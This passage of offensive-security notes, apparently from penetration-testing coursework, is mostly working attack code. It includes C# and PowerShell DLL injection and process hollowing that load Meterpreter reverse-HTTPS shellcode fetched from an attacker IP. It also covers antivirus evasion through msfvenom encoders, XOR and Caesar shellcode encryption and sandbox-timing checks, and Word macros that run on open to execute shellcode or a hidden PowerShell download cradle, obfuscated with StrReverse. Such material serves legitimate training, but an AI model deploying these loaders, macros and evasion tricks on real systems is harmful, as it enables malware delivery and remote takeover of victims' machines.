            String dir = Environment.GetFolderPath(Environment.SpecialFolder.MyDocuments);
            String dllName = dir + "\\met.dll";

            WebClient wc = new WebClient();
            wc.DownloadFile("http://192.168.45.179/met.dll", dllName);

            Process[] expProc = Process.GetProcessesByName("explorer");
            int pid = expProc[0].Id;

            IntPtr hProcess = OpenProcess(0x001F0FFF, false, pid);

            IntPtr addr = VirtualAllocEx(hProcess, IntPtr.Zero, 0x1000, 0x3000, 0x40);

            IntPtr outSize;

            Boolean res = WriteProcessMemory(hProcess, addr, Encoding.Default.GetBytes(dllName), dllName.Length, out outSize);

            IntPtr loadLib = GetProcAddress(GetModuleHandle("kernel32.dll"), "LoadLibraryA");

            IntPtr hThread = CreateRemoteThread(hProcess, IntPtr.Zero, 0, loadLib, addr, 0, IntPtr.Zero);
        }
    }
}
```

## Reflective DLL Injection in PowerShell

Inject an unmanaged Meterpreter DLL into a process

```pwsh
$bytes = (New-Object System.Net.WebClient).DownloadData('http://192.168.45.179/met.dll')
$procid = (Get-Process -Name explorer).Id
# Import-Module C:\Tools\Invoke-ReflectivePEInjection.ps1
IEX((New-Object System.Net.WebClient).DownloadString('http://192.168.45.179/Invoke-ReflectivePEInjection.ps1'))
Invoke-ReflectivePEInjection -PEBytes $bytes -ProcId $procid
```

## Process Hollowing in C#

```csharp
using System;
using System.Runtime.InteropServices;

namespace ProcessHollowing
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            STARTUPINFO si = new STARTUPINFO();
            PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

            bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

            PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
            uint tmp = 0;
            IntPtr hProcess = pi.hProcess;
            ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

            IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

            byte[] addrBuf = new byte[IntPtr.Size];
            IntPtr nRead = IntPtr.Zero;
            ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

            IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

            byte[] data = new byte[0x200];
            ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

            uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

            uint opthdr = e_lfanew_offset + 0x28;

            uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

            IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp
            byte[] buf = new byte[722] {0x06, 0xb2, 0x79, 0x1e, 0x0a, 0x12, 0x36, 0xfa, ..., 0x2f};

            WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

            ResumeThread(pi.hThread);
        }
    }
}
```

# Antivirus Evasion

Zero out the byte at offset 18867 of the executable, and write the modified executable to a new file

```pwsh
$bytes  = [System.IO.File]::ReadAllBytes("C:\Tools\met.exe")
$bytes[18867] = 0
[System.IO.File]::WriteAllBytes("C:\Tools\met_mod.exe", $bytes)
```

## Bypassing Antivirus with Metasploit

```bash
msfvenom --list encoders
```

The `x86/shikata_ga_nai` encoder is a commonly-used polymorphic encoder that produces different output each time it is run => signature evasion. `x64/zutto_dekiru` encoder borrows many techniques from it.

```bash
msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x86/shikata_ga_nai -f exe -o met.exe

msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 -e x64/zutto_dekiru -f exe -o met64_zutto.exe
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.176.134 LPORT=443 -e x64/zutto_dekiru -x /home/kali/notepad.exe -f exe -o met64_notepad.exe
```

```bash
msfvenom --list encrypt
```

```bash
msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.119.120 LPORT=443 --encrypt aes256 --encrypt-key fdgdgj93jf43uj983uf498f43 -f exe -o met64_aes.exe
```

## Bypassing Antivirus with C#

### Encrypt the shellcode

Hardcode the shellcode

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/x64/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { ... };

            byte[] encoded = new byte[buf.Length];
            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("0x{0:x2}, ", b);
            }

            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

#### helper.exe

`helper.exe <Kali IP> <msfvenom-generated csharp shellcode file>`

```csharp
using System;
using System.Text;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        byte[] encoded = new byte[buf.Length];
                        for (int i = 0; i < buf.Length; i++)
                        {
                            //encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                            encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        StringBuilder hex = new StringBuilder(encoded.Length * 2);
                        //foreach (byte b in encoded)
                        for (int i = 0; i < encoded.Length; i++)
                        {
                            if (i != encoded.Length - 1)
                                hex.AppendFormat("0x{0:x2}, ", encoded[i]);
                            else
                                hex.AppendFormat("0x{0:x2}", encoded[i]);
                        }
                        Console.WriteLine("byte[] buf = new byte[" + buf.Length + "] {" + hex.ToString() + "};");
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

#### helper.py

`python helper.py <msfvenom-generated csharp shellcode file>`

```python
import sys
import requests
import re

def main():
    # Check if the correct number of command-line arguments is provided
    if len(sys.argv) != 2:
        print("Please provide filename as command-line arguments.")
        return

    url = f"http://127.0.0.1/{sys.argv[1]}"

    try:
        # Download the file content as a string directly into memory
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses
        declaration = response.text.strip()

        # Use a regex to extract the byte values
        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)

        if match:
            byte_values = match.group(1)
            hex_array = byte_values.split(',')

            # Create the byte array with the dynamic size based on the number of hex values
            buf = bytearray()

            for hex_value in hex_array:
                # Convert each hex string to a byte
                buf.append(int(hex_value.strip(), 16))

            # Encode the bytes
            encoded = bytearray((b ^ 0xfa) for b in buf)

            hex_representation = ', '.join(f"0x{b:02x}" for b in encoded)
            print(f"byte[] buf = new byte[{len(buf)}] {{{hex_representation}}};")
        else:
            print("The file does not contain a valid byte array declaration.")
    except Exception as ex:
        print(f"Error reading file: {ex}")

if __name__ == "__main__":
    main()
```

Hardcode the shellcode

```csharp
using System;
using System.Runtime.InteropServices;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            byte[] buf = new byte[695] { <encrypted shellcode> };

            for (int i = 0; i < buf.Length; i++)
            {
                buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                // buf[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            int size = buf.Length;

            IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

            Marshal.Copy(buf, 0, addr, size);

            IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

            WaitForSingleObject(hThread, 0xFFFFFFFF);
        }
    }
}
```

### run.exe

`run.exe <Kali IP> <encrypted csharp shellcode file>`

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);

        [DllImport("kernel32.dll")]
        static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

        [DllImport("kernel32.dll")]
        static extern UInt32 WaitForSingleObject(IntPtr hHandle, UInt32 dwMilliseconds);

        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        for (int i = 0; i < buf.Length; i++)
                        {
                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        int size = buf.Length;

                        IntPtr addr = VirtualAlloc(IntPtr.Zero, 0x1000, 0x3000, 0x40);

                        Marshal.Copy(buf, 0, addr, size);

                        IntPtr hThread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);

                        WaitForSingleObject(hThread, 0xFFFFFFFF);
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

### hol.exe

`hol.exe <Kali IP> <filename>`

```csharp
using System;
using System.Runtime.InteropServices;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace BypassingAntivirus
{
    class Program
    {
        [DllImport("kernel32.dll")]
        static extern void Sleep(uint dwMilliseconds);

        [DllImport("kernel32.dll", SetLastError = true, ExactSpelling = true)]
        static extern IntPtr VirtualAllocExNuma(IntPtr hProcess, IntPtr lpAddress, uint dwSize, UInt32 flAllocationType, UInt32 flProtect, UInt32 nndPreferred);

        [DllImport("kernel32.dll")]
        static extern IntPtr GetCurrentProcess();

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern IntPtr FlsAlloc(IntPtr callback);

        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
        static extern bool CreateProcess(string lpApplicationName, string lpCommandLine,
    IntPtr lpProcessAttributes, IntPtr lpThreadAttributes, bool bInheritHandles,
        uint dwCreationFlags, IntPtr lpEnvironment, string lpCurrentDirectory,
            [In] ref STARTUPINFO lpStartupInfo, out PROCESS_INFORMATION lpProcessInformation);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Ansi)]
        struct STARTUPINFO
        {
            public Int32 cb;
            public IntPtr lpReserved;
            public IntPtr lpDesktop;
            public IntPtr lpTitle;
            public Int32 dwX;
            public Int32 dwY;
            public Int32 dwXSize;
            public Int32 dwYSize;
            public Int32 dwXCountChars;
            public Int32 dwYCountChars;
            public Int32 dwFillAttribute;
            public Int32 dwFlags;
            public Int16 wShowWindow;
            public Int16 cbReserved2;
            public IntPtr lpReserved2;
            public IntPtr hStdInput;
            public IntPtr hStdOutput;
            public IntPtr hStdError;
        }

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_INFORMATION
        {
            public IntPtr hProcess;
            public IntPtr hThread;
            public int dwProcessId;
            public int dwThreadId;
        }

        [DllImport("ntdll.dll", CallingConvention = CallingConvention.StdCall)]
        private static extern int ZwQueryInformationProcess(IntPtr hProcess,
    int procInformationClass, ref PROCESS_BASIC_INFORMATION procInformation,
        uint ProcInfoLen, ref uint retlen);

        [StructLayout(LayoutKind.Sequential)]
        internal struct PROCESS_BASIC_INFORMATION
        {
            public IntPtr Reserved1;
            public IntPtr PebAddress;
            public IntPtr Reserved2;
            public IntPtr Reserved3;
            public IntPtr UniquePid;
            public IntPtr MoreReserved;
        }

        [DllImport("kernel32.dll", SetLastError = true)]
        static extern bool ReadProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress,
    [Out] byte[] lpBuffer, int dwSize, out IntPtr lpNumberOfBytesRead);

        [DllImport("kernel32.dll")]
        static extern bool WriteProcessMemory(IntPtr hProcess, IntPtr lpBaseAddress, byte[] lpBuffer, Int32 nSize, out IntPtr lpNumberOfBytesWritten);

        [DllImport("kernel32.dll", SetLastError = true)]
        private static extern uint ResumeThread(IntPtr hThread);

        static void Main(string[] args)
        {
            DateTime t1 = DateTime.Now;
            Sleep(2000);
            double t2 = DateTime.Now.Subtract(t1).TotalSeconds;
            if (t2 < 1.5)
            {
                return;
            }

            IntPtr mem = VirtualAllocExNuma(GetCurrentProcess(), IntPtr.Zero, 0x1000, 0x3000, 0x4, 0);
            if (mem == null)
            {
                return;
            }

            IntPtr flsindex = FlsAlloc(IntPtr.Zero);
            if (flsindex == null)
            {
                return;
            }

            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        for (int i = 0; i < buf.Length; i++)
                        {
                            //buf[i] = (byte)(((uint)buf[i] - 2) & 0xFF);
                            buf[i] = (byte)((uint)buf[i] ^ 0xfa);
                        }

                        STARTUPINFO si = new STARTUPINFO();
                        PROCESS_INFORMATION pi = new PROCESS_INFORMATION();

                        bool res = CreateProcess(null, "C:\\Windows\\System32\\svchost.exe", IntPtr.Zero,
                            IntPtr.Zero, false, 0x4, IntPtr.Zero, null, ref si, out pi);

                        PROCESS_BASIC_INFORMATION bi = new PROCESS_BASIC_INFORMATION();
                        uint tmp = 0;
                        IntPtr hProcess = pi.hProcess;
                        ZwQueryInformationProcess(hProcess, 0, ref bi, (uint)(IntPtr.Size * 6), ref tmp);

                        IntPtr ptrToImageBase = (IntPtr)((Int64)bi.PebAddress + 0x10);

                        byte[] addrBuf = new byte[IntPtr.Size];
                        IntPtr nRead = IntPtr.Zero;
                        ReadProcessMemory(hProcess, ptrToImageBase, addrBuf, addrBuf.Length, out nRead);

                        IntPtr svchostBase = (IntPtr)(BitConverter.ToInt64(addrBuf, 0));

                        byte[] data = new byte[0x200];
                        ReadProcessMemory(hProcess, svchostBase, data, data.Length, out nRead);

                        uint e_lfanew_offset = BitConverter.ToUInt32(data, 0x3C);

                        uint opthdr = e_lfanew_offset + 0x28;

                        uint entrypoint_rva = BitConverter.ToUInt32(data, (int)opthdr);

                        IntPtr addressOfEntryPoint = (IntPtr)(entrypoint_rva + (UInt64)svchostBase);

                        WriteProcessMemory(hProcess, addressOfEntryPoint, buf, buf.Length, out nRead);

                        ResumeThread(pi.hThread);
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

## Bypassing Antivirus in VBA

### Encrypt the shellcode

Hardcode the shellcode

```csharp
using System;
using System.Text;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // msfvenom -p windows/meterpreter/reverse_https LHOST=192.168.45.179 LPORT=443 EXITFUNC=thread -f csharp 
            byte[] buf = new byte[695] { };

            byte[] encoded = new byte[buf.Length];

            for (int i = 0; i < buf.Length; i++)
            {
                encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                // encoded[i] = (byte)((uint)buf[i] ^ 0xfa);
            }

            uint counter = 0;

            StringBuilder hex = new StringBuilder(encoded.Length * 2);
            foreach (byte b in encoded)
            {
                hex.AppendFormat("{0:D}, ", b);
                counter++;
                if (counter % 50 == 0)
                {
                    hex.AppendFormat("_{0}", Environment.NewLine);
                }
            }
            Console.WriteLine("The payload is: " + hex.ToString());
        }
    }
}
```

#### helper2.exe

`helper2.exe <Kali IP> <msfvenom-generated csharp shellcode file>`

```csharp
using System;
using System.Text;
using System.Net.Http;
using System.Text.RegularExpressions;

namespace Helper
{
    class Program
    {
        static void Main(string[] args)
        {
            // Check if a URL was provided
            if (args.Length != 2)
            {
                Console.WriteLine("Please provide the IP and filename as command-line arguments.");
                return;
            }

            string url = "http://" + args[0] + "/" + args[1];

            try
            {
                using (HttpClient client = new HttpClient())
                {
                    // Download the file content as a string directly into memory
                    string declaration = client.GetStringAsync(url).Result; // Blocking call
                    declaration = declaration.Trim();

                    // Use a regex to extract the byte values
                    //var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};");
                    var match = Regex.Match(declaration, @"new byte\[\d+\] \{(.*?)\};", RegexOptions.Singleline);

                    if (match.Success)
                    {
                        string byteValues = match.Groups[1].Value;
                        string[] hexArray = byteValues.Split(',');

                        // Create the byte array with the dynamic size based on the number of hex values
                        byte[] buf = new byte[hexArray.Length];

                        for (int i = 0; i < hexArray.Length; i++)
                        {
                            // Convert each hex string to a byte
                            buf[i] = Convert.ToByte(hexArray[i].Trim(), 16);
                        }

                        byte[] encoded = new byte[buf.Length];
                        for (int i = 0; i < buf.Length; i++)
                        {
                            encoded[i] = (byte)(((uint)buf[i] + 2) & 0xFF);
                        }

                        uint counter = 0;

                        StringBuilder hex = new StringBuilder(encoded.Length * 2);

                        foreach (byte b in encoded)
                        {
                            if (counter != encoded.Length - 1)
                                hex.AppendFormat("{0:D}, ", b);
                            else
                                hex.AppendFormat("{0:D}", b);
                            counter++;
                            if (counter % 50 == 0)
                            {
                                hex.AppendFormat("_{0}", Environment.NewLine);
                            }
                        }
                        Console.WriteLine("buf = Array(" + hex.ToString() + ")");
                    }
                    else
                    {
                        Console.WriteLine("The file does not contain a valid byte array declaration.");
                    }
                }
            }
            catch (Exception ex)
            {
                Console.WriteLine($"Error reading file: {ex.Message}");
            }
        }
    }
}
```

#### helper2.py

`python helper2.py <msfvenom-generated csharp shellcode file>`

```python
import sys
import requests
import re

def main():
    # Check if an IP and filename were provided
    if len(sys.argv) != 2:
        print("Please provide filename as command-line arguments.")
        return

    url = f"http://127.0.0.1/{sys.argv[1]}"

    try:
        # Download the file content as a string directly into memory
        response = requests.get(url)
        response.raise_for_status()  # Raise an error for bad responses
        declaration = response.text.strip()

        # Use a regex to extract the byte values
        match = re.search(r'new byte\[\d+\] \{(.*?)\};', declaration, re.DOTALL)

        if match:
            byte_values = match.group(1)
            hex_array = byte_values.split(',')

            # Create the byte array with the dynamic size based on the number of hex values
            buf = bytearray(int(val.strip(), 16) for val in hex_array)

            # Encode the byte values
            encoded = bytearray((b + 2) & 0xFF for b in buf)

            # Format the output
            hex_output = []
            for i, b in enumerate(encoded):
                hex_output.append(str(b))
                if (i + 1) % 50 == 0:
                    hex_output.append('_\n')
            output = "buf = Array(" + ", ".join(hex_output) + ")"
            print(output)
        else:
            print("The file does not contain a valid byte array declaration.")
    except Exception as ex:
        print(f"Error reading file: {ex}")

if __name__ == "__main__":
    main()
```

```VB
Private Declare PtrSafe Function CreateThread Lib "KERNEL32" (ByVal SecurityAttributes As Long, ByVal StackSize As Long, ByVal StartFunction As LongPtr, ThreadParameter As LongPtr, ByVal CreateFlags As Long, ByRef ThreadId As Long) As LongPtr

Private Declare PtrSafe Function VirtualAlloc Lib "KERNEL32" (ByVal lpAddress As LongPtr, ByVal dwSize As Long, ByVal flAllocationType As Long, ByVal flProtect As Long) As LongPtr

Private Declare PtrSafe Function RtlMoveMemory Lib "KERNEL32" (ByVal lDestination As LongPtr, ByRef sSource As Any, ByVal lLength As Long) As LongPtr

Private Declare PtrSafe Function Sleep Lib "KERNEL32" (ByVal mili As Long) As Long

Function MyMacro()
    Dim buf As Variant
    Dim addr As LongPtr
    Dim counter As Long
    Dim data As Long
    Dim res As Long
    Dim t1 As Date
    Dim t2 As Date
    Dim time As Long

    t1 = Now()
    Sleep (2000)
    t2 = Now()
    time = DateDiff("s", t1, t2)

    If time < 2 Then
        Exit Function
    End If

    buf = Array(<encrypted shellcode>)

    For i = 0 To UBound(buf)
        buf(i) = buf(i) - 2
    Next i

    addr = VirtualAlloc(0, UBound(buf), &H3000, &H40)
    
    For counter = LBound(buf) To UBound(buf)
        data = buf(counter)
        res = RtlMoveMemory(addr + counter, data, 1)
    Next counter
    
    res = CreateThread(0, 0, addr, 0, 0, 0)
End Function 

Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub
```

## Stomping On Microsoft Word

### fakecode.vba

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    MsgBox ("This is a macro test")
End Sub
```

Automate the VBA Stomping process with Evil Clippy

```bat
EvilClippy.exe -s fakecode.vba Doc1.doc
```

## Hiding PowerShell Inside VBA

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    Shell strArg, vbHide
End Sub
```

### Dechaining with WMI

PowerShell is running as a 64-bit process => update the PowerShell shellcode runner script accordingly

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    strArg = "powershell -exec bypass -nop -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
    GetObject("winmgmts:").Get("Win32_Process").Create strArg, Null, Null, pid
End Sub
```

### Obfuscating VBA

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Sub MyMacro()
    Dim strArg As String
    strArg = StrReverse("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(StrReverse(":stmgmniw")).Get(StrReverse("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Reduce the number of times **StrReverse** appears in our code

```VB
Sub Document_Open()
    MyMacro
End Sub

Sub AutoOpen()
    MyMacro
End Sub

Function bears(cows)
    bears = StrReverse(cows)
End Function

Sub MyMacro()
    Dim strArg As String
    strArg = bears("))'txt.nur/021.911.861.291//:ptth'(gnirtsdaolnwod.)tneilcbew.ten.metsys tcejbo-wen((xei c- pon- ssapyb cexe- llehsrewop")

    GetObject(bears(":stmgmniw")).Get(bears("ssecorP_23niW")).Create strArg, Null, Null, pid
End Sub
```

Perform a more complex obfuscation (Caesar cipher encryption)

```pwsh
$payload = "powershell -exec bypass -nop -w hidden -c iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"

# $payload = "winmgmts:"

# $payload = "Win32_Process"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 23
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
